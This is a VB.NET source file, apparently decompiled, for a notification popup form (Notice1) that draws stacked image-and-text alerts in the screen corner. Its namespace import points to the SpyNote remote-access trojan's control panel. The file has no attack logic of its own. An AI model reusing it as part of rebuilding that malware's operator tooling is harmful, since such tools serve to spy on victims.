Imports Microsoft.VisualBasic.CompilerServices
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports SpyNote_V6._4.SN

Public Class Notice1
    Private CBackColor1 As Color

    Private CBackColor0 As Color

    Private CForColor As Color

    Public MyFont As System.Drawing.Font

    Public Items As List(Of Notice1.Notifications)

    Private bool_0 As Boolean

    Public Threading_0 As Thread
    Public Sub New()
        Me.CBackColor1 = Color.FromArgb(37, 37, 38)
        Me.CBackColor0 = Color.FromArgb(37, 37, 38)
        Me.CForColor = Color.FromArgb(241, 241, 241)
        Me.MyFont = New System.Drawing.Font("Segoe UI Semibold", 8.25!, FontStyle.Regular)
        Me.InitializeComponent()
        Try
            Me.bool_0 = True
            Me.Items = New List(Of Notice1.Notifications)()
        Catch exception As System.Exception
        End Try
    End Sub
    Public Sub AddItem(ByVal img As Bitmap, ByVal Text As String)
        Try
            SyncLock Me.Items
                If (Me.Items.Count >= 60) Then
                    Me.Items.RemoveAt(0)
                End If
                Dim notification As Notice1.Notifications = New Notice1.Notifications() With
                {
                    .bitmap_0 = DirectCast(img.Clone(), Bitmap),
                    .string_0 = Text
                }
                Me.Items.Add(notification)
            End SyncLock
        Catch exception As System.Exception
        End Try
    End Sub
    Private Sub Notice1_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Try
            Control.CheckForIllegalCrossThreadCalls = False
            Me.p.BackColor = Color.FromArgb(3, 2, 3)
            MyBase.TransparencyKey = Color.FromArgb(3, 2, 3)
            Dim workingArea As Rectangle = Screen.PrimaryScreen.WorkingArea
            Dim width As Integer = workingArea.Width - MyBase.Width
            workingArea = Screen.PrimaryScreen.WorkingArea
            Dim height As Integer = workingArea.Height - MyBase.Height
            MyBase.Location = New Point(width, height)
            Me.Threading_0 = New Thread(New ThreadStart(AddressOf Me.working))
            Me.Threading_0.Start()
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub p_Click(ByVal sender As Object, ByVal e As EventArgs) Handles p.Click
        Try
            SyncLock Me.Items
                Me.Items.Clear()
            End SyncLock
            Me.p.Image = Nothing
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub p_MouseHover(ByVal sender As Object, ByVal e As EventArgs) Handles p.MouseHover
        Me.CForColor = Color.FromArgb(190, 190, 190)
    End Sub

    Private Sub p_MouseLeave(ByVal sender As Object, ByVal e As EventArgs) Handles p.MouseLeave
        Me.CForColor = Color.FromArgb(241, 241, 241)
    End Sub

    Public Sub tHide()
        Try
            Me.p.Image = Nothing
            Me.bool_0 = False
            Dim workingArea As Rectangle = Screen.PrimaryScreen.WorkingArea
            MyBase.Left = workingArea.Width
            MyBase.Top = workingArea.Height + 100
        Catch exception As System.Exception
        End Try
    End Sub

    Public Sub tShow()
        Try
            Me.bool_0 = True
            Dim workingArea As Rectangle = Screen.PrimaryScreen.WorkingArea
            MyBase.Left = workingArea.Width - MyBase.Width - 5
            MyBase.Top = workingArea.Height - MyBase.Height - 5 + 100
            If (MyBase.Opacity <> 0.95) Then
                MyBase.Opacity = 0.95
            End If
        Catch exception As System.Exception
        End Try
    End Sub
    Public Sub working()
        While True
            Try
                Thread.Sleep(40)
                Dim flag As Boolean = Me.Items.Count = 0
                If flag Then
                    Me.tHide()
                Else
                    Dim flag2 As Boolean = Me.p.SizeMode <> PictureBoxSizeMode.StretchImage
                    If flag2 Then
                        Me.p.SizeMode = PictureBoxSizeMode.StretchImage
                    End If
                    Try
                        Dim bitmap As Bitmap = New Bitmap(Me.p.Width, Me.p.Height)
                        Dim graphics As Graphics = Graphics.FromImage(bitmap)
                        graphics.Clear(Me.p.BackColor)
                        graphics.SmoothingMode = SmoothingMode.AntiAlias
                        Dim items As List(Of Notice1.Notifications) = Me.Items
                        Dim obj As Object = items
                        SyncLock obj
                            Try
                                For Each notifications As Notice1.Notifications In Me.Items
                                    Dim flag4 As Boolean = notifications.int_0 <= 2
                                    If flag4 Then
                                        notifications.int_0 = 2
                                        Dim notifications2 As Notice1.Notifications = notifications
                                        notifications2.wait += 1
                                    Else
                                        Dim count As Integer = Me.Items.Count
                                        Dim flag5 As Boolean = count > 60
                                        If flag5 Then
                                            notifications.int_0 = 2
                                        Else
                                            Dim flag6 As Boolean = count > 20
                                            If flag6 Then
                                                Dim notifications2 As Notice1.Notifications = notifications
                                                notifications2.int_0 += -14
                                            Else
                                                Dim flag7 As Boolean = count > 15
                                                If flag7 Then
                                                    Dim notifications2 As Notice1.Notifications = notifications
                                                    notifications2.int_0 += -8
                                                Else
                                                    Dim flag8 As Boolean = count > 10
                                                    If flag8 Then
                                                        Dim notifications2 As Notice1.Notifications = notifications
                                                        notifications2.int_0 += -4
                                                    Else
                                                        Dim flag9 As Boolean = count > 5
                                                        If flag9 Then
                                                            Dim notifications2 As Notice1.Notifications = notifications
                                                            notifications2.int_0 += -2
                                                        Else
                                                            Dim notifications2 As Notice1.Notifications = notifications
                                                            notifications2.int_0 += -1
                                                        End If
                                                    End If
                                                End If
                                            End If
                                        End If
                                        Dim flag10 As Boolean = notifications.int_0 <= 2
                                        If flag10 Then
                                            notifications.int_0 = 2
                                        End If
                                    End If
                                    Dim size As Size = TextRenderer.MeasureText(notifications.string_0, Me.MyFont)
                                    size.Width = bitmap.Width
                                    size.Height += 15
                                    Dim rectangle As Rectangle = New Rectangle(0, notifications.int_0 - 2, MyBase.Width - 5, size.Height)
                                    Dim brush As LinearGradientBrush = New LinearGradientBrush(rectangle, Me.CBackColor0, Me.CBackColor0, LinearGradientMode.BackwardDiagonal)
                                    graphics.FillPath(brush, Draw.RoundRect(rectangle, 1))
                                    rectangle = New Rectangle(0, notifications.int_0 - 2, 0, 0)
                                    ControlPaint.DrawLockedFrame(graphics, rectangle, False)
                                    Dim array As Object() = New Object(1) {}
                                    array(0) = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(notifications.bitmap_0.Clone()))
                                    Dim point As Point = New Point(7, notifications.int_0 + 3)
                                    array(1) = point
                                    NewLateBinding.LateCall(graphics, Nothing, "DrawImage", array, Nothing, Nothing, Nothing, True)
                                    graphics.DrawString(notifications.string_0, Me.MyFont, New SolidBrush(Me.CForColor), 5.0F, CSng(notifications.int_0))
                                    Dim color As Color = Color.FromArgb(45, 45, 48)
                                    Dim bounds As Rectangle = New Rectangle(0, notifications.int_0 - 2, MyBase.Width - 4, size.Height + 1)
                                    ControlPaint.DrawBorder(graphics, bounds, color, 2, ButtonBorderStyle.Solid, color, 2, ButtonBorderStyle.Solid, color, 2, ButtonBorderStyle.Solid, color, 2, ButtonBorderStyle.Solid)
                                    Dim flag11 As Boolean = notifications.int_0 > MyBase.Height - 50
                                    If flag11 Then
                                        Exit For
                                    End If
                                Next
                            Finally
                            End Try
                            While True
IL_384:
                                Try
                                    For Each notifications3 As Notice1.Notifications In Me.Items
                                        Dim flag12 As Boolean = notifications3.wait >= 20
                                        If flag12 Then
                                            Me.Items.Remove(notifications3)
                                            GoTo IL_384
                                        End If
                                    Next
                                Finally
                                End Try
                                Exit While
                            End While
                            Dim flag13 As Boolean = Me.Items.Count = 0 And Me.bool_0
                            If flag13 Then
                                Me.tHide()
                            End If
                            Dim flag14 As Boolean = Me.Items.Count > 0 And Not Me.bool_0
                            If flag14 Then
                                Me.tShow()
                            End If
                        End SyncLock
                        graphics.Flush(FlushIntention.Sync)
                        graphics.Dispose()
                        Me.p.Image = bitmap
                    Catch ex As Exception
                    End Try
                End If
            Catch ex2 As Exception
            End Try
        End While
    End Sub
    Public NotInheritable Class Notifications
        Public bitmap_0 As Bitmap

        Public int_0 As Integer

        Public wait As Integer

        Public string_0 As String

        Public Sub New()
            MyBase.New()
            Me.int_0 = My.Forms.Notice1.Height
            Me.wait = 0
        End Sub
    End Class
End Class